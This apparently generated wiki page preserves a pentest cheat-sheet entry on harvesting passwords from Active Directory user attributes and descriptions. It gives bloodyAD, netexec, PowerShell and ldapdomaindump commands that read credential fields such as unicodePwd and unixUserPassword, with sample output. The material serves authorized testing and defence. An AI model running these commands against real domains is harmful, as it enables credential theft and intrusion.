---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - AD User Comment

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-comments` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-comments.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

There are 3-4 fields that seem to be common in most Active Directory schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.

## Preserved Body

````markdown
There are 3-4 fields that seem to be common in most Active Directory schemas: `UserPassword`, `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.

* Windows/Linux command

    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description
    ```

* Password in User Description

    ```powershell
    netexec ldap domain.lab -u 'username' -p 'password' -M user-desc
    netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
    GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
    GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
    GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
    ```

* Get `unixUserPassword` attribute from all users in ldap

    ```ps1
    nxc ldap 10.10.10.10 -u user -p pass -M get-unixUserPassword -M getUserPassword
    ```

* Native Powershell command

    ```powershell
    Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
    ```

* Dump the Active Directory and `grep` the content.

    ```powershell
    ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
    ```
````

## Source Verification

[source record](../../sources/internalallthethings/password-ad-user-comment.md)

## Evidence Excerpt

````text
_body: "# Password - AD User Comment\n\nThere are 3-4 fields that seem to be common in most Active Directory schemas: `UserPassword`,\
\ `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.\n\n* Windows/Linux command\n\n    ```ps1\n    bloodyAD -u user\
\ -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))'\
\ --attr userPassword,unixUserPassword,unicodePwd,description\n    ```\n\n* Password in User Description\n\n    ```powershell\n\
\    netexec ldap domain.lab -u 'username' -p 'password' -M user-desc\n    netexec ldap 10.0.2.11 -u 'username' -p 'password'\
\ --kdcHost 10.0.2.11 -M get-desc-users\n    GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: \n  \
\  GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain\n\
\    GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account\n    ```\n\
````
